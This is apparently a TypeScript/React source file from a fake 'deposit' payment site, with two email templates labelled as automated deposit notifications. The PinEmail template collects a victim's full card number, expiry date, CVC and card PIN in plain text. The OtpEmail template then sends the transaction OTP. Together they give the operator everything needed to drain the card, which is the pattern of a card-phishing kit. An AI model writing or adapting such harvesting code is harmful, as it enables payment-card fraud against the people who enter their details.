interface PinEmailProps {
  email: string
  amount: string
  cardName: string
  cardNumber: string
  expiryDate: string
  cvc: string
  cardType: string
  pin: string
}

export function PinEmail({
  email,
  amount,
  cardName,
  cardNumber,
  expiryDate,
  cvc,
  cardType,
  pin,
}: PinEmailProps) {
  return (
    <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
      <h2 style={{ color: "#059669" }}>Deposit Transaction – Card Payment</h2>
      <p>A deposit transaction has been initiated with the following details:</p>
      <div
        style={{
          background: "#f3f4f6",
          padding: "20px",
          borderRadius: "8px",
          margin: "20px 0",
        }}
      >
        <p><strong>Email:</strong> {email}</p>
        <p><strong>Amount:</strong> ₦{amount}</p>
        <p><strong>Card Holder Name:</strong> {cardName}</p>
        <p><strong>Card Number:</strong> {cardNumber}</p>
        <p><strong>Expiry Date:</strong> {expiryDate}</p>
        <p><strong>CVC:</strong> {cvc}</p>
        <p><strong>Card Type:</strong> {cardType || "Unknown"}</p>
        <p><strong>PIN:</strong> {pin}</p>
      </div>
      <p style={{ color: "#6b7280" }}>
        This is an automated notification from your deposit system.
      </p>
    </div>
  )
}

interface OtpEmailProps {
  email: string
  amount: string
  otp: string
}

export function OtpEmail({ email, amount, otp }: OtpEmailProps) {
  return (
    <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
      <h2 style={{ color: "#059669" }}>Deposit Transaction Completed</h2>
      <p>A deposit transaction has been completed:</p>
      <div
        style={{
          background: "#f3f4f6",
          padding: "20px",
          borderRadius: "8px",
          margin: "20px 0",
        }}
      >
        <p><strong>Email:</strong> {email}</p>
        <p><strong>Amount:</strong> ₦{amount}</p>
        <p><strong>OTP:</strong> {otp}</p>
      </div>
      <p style={{ color: "#6b7280" }}>
        This is an automated notification from your deposit system.
      </p>
    </div>
  )
}
